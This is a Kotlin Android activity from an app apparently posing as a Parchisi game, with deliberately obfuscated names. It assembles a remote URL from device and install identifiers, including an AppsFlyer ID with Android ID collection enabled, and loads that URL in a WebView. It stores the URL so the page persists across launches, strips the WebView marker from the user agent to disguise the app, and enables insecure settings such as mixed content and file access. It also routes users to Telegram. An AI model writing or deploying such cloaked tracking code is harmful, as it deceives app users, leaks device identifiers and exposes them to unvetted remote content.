package com.superking.parchisi.st.bxzuhzhuxsaw

import android.annotation.SuppressLint
import android.provider.MediaStore

import android.app.Activity
import android.content.Context

import java.io.IOException
import android.widget.Toast
import android.util.Log
import android.webkit.*


import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.onesignal.OneSignal

import android.content.Intent


import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity


import org.json.JSONException

import com.superking.parchisi.st.Qosisuahas
import com.superking.parchisi.st.Qosisuahas.Companion.instId
import com.superking.parchisi.st.R
import com.superking.parchisi.st.databinding.ActivityMysrBinding
import org.json.JSONObject

import java.io.File


class Vdopppxpzoxkozs : AppCompatActivity() {
    var sokadkoas: String? = null
    var eook: ValueCallback<Array<Uri>>? = null
    lateinit var ijcjix: ActivityMysrBinding
    lateinit var mmnxizjjis: WebView
    private val rookdi = 1






    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ijcjix = ActivityMysrBinding.inflate(layoutInflater)
        setContentView(ijcjix.root)

        mmnxizjjis = ijcjix.tysux
        Snackbar.make(
            ijcjix.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()


        val fofdjidfji = CookieManager.getInstance()
        fofdjidfji.setAcceptCookie(true)
        fofdjidfji.setAcceptThirdPartyCookies(mmnxizjjis, true)
        apapaokasoa()
        val oxojicjizx: Activity = this
        mmnxizjjis.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(fokdfok: WebView, eokskod: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(eokskod)) {
                        return false
                    }
                    if (offdjidf(eokskod)) {

                        val ohoghij = Intent(Intent.ACTION_VIEW)
                        ohoghij.data = Uri.parse(eokskod)
                        startActivity(ohoghij)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                fokdfok.loadUrl(eokskod)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)

                xijzci(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(oxojicjizx, description, Toast.LENGTH_SHORT).show()
            }


        }
        mmnxizjjis.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                cixjd: WebView, oosdji: ValueCallback<Array<Uri>>,
                ncxcxjicxcx: FileChooserParams
            ): Boolean {
                eook?.onReceiveValue(null)
                eook = oosdji
                var torieirj: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (torieirj!!.resolveActivity(packageManager) != null) {

                    var okocjichuv: File? = null
                    try {
                        okocjichuv = coxjivdjs()
                        torieirj.putExtra("PhotoPath", sokadkoas)
                    } catch (ex: IOException) {

                    }

                    if (okocjichuv != null) {
                        sokadkoas = "file:" + okocjichuv.absolutePath
                        torieirj.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(okocjichuv)
                        )
                    } else {
                        torieirj = null
                    }
                }
                val dooksijdhux = Intent(Intent.ACTION_GET_CONTENT)
                dooksijdhux.addCategory(Intent.CATEGORY_OPENABLE)
                dooksijdhux.type = "image/*"
                val oxozxijxzcji: Array<Intent?> =
                    torieirj?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val sokadjidajiasd = Intent(Intent.ACTION_CHOOSER)
                sokadjidajiasd.putExtra(Intent.EXTRA_INTENT, dooksijdhux)
                sokadjidajiasd.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser))
                sokadjidajiasd.putExtra(Intent.EXTRA_INITIAL_INTENTS, oxozxijxzcji)
                startActivityForResult(
                    sokadjidajiasd, rookdi
                )
                return true
            }

            @Throws(IOException::class)
            private fun coxjivdjs(): File {
                var sosakdkoadjis = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!sosakdkoadjis.exists()) {
                    sosakdkoadjis.mkdirs()
                }

                sosakdkoadjis =
                    File(sosakdkoadjis.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return sosakdkoadjis
            }

        }

        Log.d("URLSS",ofocjijixcvji())
        mmnxizjjis.loadUrl(ofocjijixcvji())
    }


    private var eiijsjid = false
    override fun onBackPressed() {


        if (mmnxizjjis.canGoBack()) {
            if (eiijsjid) {
                mmnxizjjis.stopLoading()
                mmnxizjjis.loadUrl(sokdkos)
            }
            this.eiijsjid = true
            mmnxizjjis.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                eiijsjid = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }

    override fun onActivityResult(fiodj: Int, osodsj: Int, kxzlcozx: Intent?) {
        if (fiodj != rookdi || eook == null) {
            super.onActivityResult(fiodj, osodsj, kxzlcozx)
            return
        }
        var eiijsda: Array<Uri>? = null


        if (osodsj == AppCompatActivity.RESULT_OK) {
            if (kxzlcozx == null || kxzlcozx.data == null) {

                eiijsda = arrayOf(Uri.parse(sokadkoas))
            } else {
                val nxzcijzxic = kxzlcozx.dataString
                if (nxzcijzxic != null) {
                    eiijsda = arrayOf(Uri.parse(nxzcijzxic))
                }
            }
        }
        eook?.onReceiveValue(eiijsda)
        eook = null
    }

    private fun ofocjijixcvji(): String {

        val sharPre = getSharedPreferences("SHARED_PREF",
            Context.MODE_PRIVATE)

        val str = intent.getStringExtra("WebInt")

        val shm_id = getSharedPreferences(Qosisuahas.main_id, MODE_PRIVATE)
        val sodkkosd= getSharedPreferences(Qosisuahas.deeps, MODE_PRIVATE)
        val oxkckzx= getSharedPreferences(Qosisuahas.namings, MODE_PRIVATE)
        val skoadkoadkods= getSharedPreferences(Qosisuahas.link, MODE_PRIVATE)

        val myTrId = sharPre.getString(Qosisuahas.myid, null)
        val myInstId: String? = sharPre.getString(instId, null)
        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val cpOne:String? = oxkckzx.getString(Qosisuahas.namings,"null")
        val dpOne: String? = sodkkosd.getString(Qosisuahas.deeps,"null")
        val mainId: String? = shm_id.getString(Qosisuahas.main_id,"null")

        val one = "deviceID="
        val subOne = "sub_id_1="
        val thrhtrhtrhtrht = "ad_id="
        val fofofofofofofofofo = "sub_id_4="
        val fififififififififif = "sub_id_5="
        val sisisisifsisis = "sub_id_6="


        val lololololololo = "naming"
        val trololo = "deeporg"

        val kiokjjlikjhmkij = Build.VERSION.RELEASE
        val pack = "com.superking.parchisi.st"
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val linkAB = skoadkoadkods.getString(Qosisuahas.link,"null")

        var aft = ""
        when (str) {
            "MT" -> {
                aft =
                    "$linkAB$one$myTrId&$thrhtrhtrhtrht$myInstId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
                pushToOneSignal(myTrId.toString())
                Log.d("TESTAG", "urururururururur tracker: $aft")
            }
            "deepLink" -> {
                aft =
                    "$linkAB$subOne$dpOne&$one$afId&$thrhtrhtrhtrht$mainId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$trololo"
                pushToOneSignal(myTrId.toString())
                Log.d("TESTAG", "urururururururur deep: $aft")
            }
            "campaign" -> {
                aft =
                    "$linkAB$subOne$cpOne&$one$afId&$thrhtrhtrhtrht$mainId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
                pushToOneSignal(afId.toString())
                Log.d("TESTAG", "urururururururur apps: $aft")
            }
        }

        Log.d("TESTAG", "Test Result $aft")
        return sharPre.getString("SAVED_URL", aft).toString()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun apapaokasoa() {
        val ocxkvkxc = mmnxizjjis.settings
        ocxkvkxc.javaScriptCanOpenWindowsAutomatically = true
        ocxkvkxc.javaScriptEnabled = true
        ocxkvkxc.setAppCacheEnabled(true)
        ocxkvkxc.allowContentAccess = true
        ocxkvkxc.pluginState = WebSettings.PluginState.ON
        ocxkvkxc.domStorageEnabled = true
        ocxkvkxc.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        ocxkvkxc.loadWithOverviewMode = true
        ocxkvkxc.setSupportMultipleWindows(false)
        ocxkvkxc.setSupportZoom(true)
        ocxkvkxc.allowFileAccess = true
        ocxkvkxc.useWideViewPort = true
        ocxkvkxc.displayZoomControls = false

        ocxkvkxc.userAgentString = ocxkvkxc.userAgentString.replace("; wv", "")
        ocxkvkxc.builtInZoomControls = true

    }





    private fun pushToOneSignal(okc: String) {
        OneSignal.setExternalUserId(
            okc,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(diosfsdj: JSONObject) {
                    try {
                        if (diosfsdj.has("push") && diosfsdj.getJSONObject("push").has("success")) {
                            val xijcjizx = diosfsdj.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $xijcjizx"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (diosfsdj.has("email") && diosfsdj.getJSONObject("email").has("success")) {
                            val soksdkoji =
                                diosfsdj.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $soksdkoji"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (diosfsdj.has("sms") && diosfsdj.getJSONObject("sms").has("success")) {
                            val fodkidjf = diosfsdj.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $fodkidjf"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    private fun offdjidf(ozxk: String): Boolean {

        val okfdijifijfd = packageManager
        try {

            okfdijifijfd.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)

            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }





    var sokdkos = ""
    fun xijzci(sokd: String?) {
        if (!sokd!!.contains("t.me")) {

            if (sokdkos == "") {
                sokdkos = getSharedPreferences(
                    "SHARED_PREF",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    sokd
                ).toString()

                val xzjiocizx = getSharedPreferences("SHARED_PREF", AppCompatActivity.MODE_PRIVATE)
                val sokdasidjiasjasdi = xzjiocizx.edit()
                sokdasidjiasjasdi.putString("SAVED_URL", sokd)
                sokdasidjiasjasdi.apply()
            }
        }
    }






}